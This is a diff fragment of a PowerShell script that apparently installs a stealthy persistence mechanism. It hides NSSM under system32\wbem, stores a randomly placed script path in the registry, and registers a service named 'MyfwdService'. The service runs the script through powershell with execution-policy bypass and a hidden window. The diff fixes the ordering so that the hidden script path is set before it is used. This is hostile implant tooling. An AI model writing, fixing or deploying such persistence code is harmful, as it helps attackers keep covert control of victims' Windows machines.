@@ -16,16 +16,16 @@ $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
 $serviceName = "MyfwdService"
 $propertyName = "fwd"
-$exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdPath"
-$downloadPath = "$env:temp\nssm.zip"
-
-
 if(($fwdPath -eq $null) -or ($fwdPath -eq "")){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\f.ps1"
     Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
 }
+$exepath = "powershell.exe"
+$arguments = "-ep bypass -nop -w hidden '$fwdPath'"
+$downloadPath = "$env:temp\nssm.zip"
+
+
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
     New-Item -Path $nssmFolder -ItemType Directory -Force
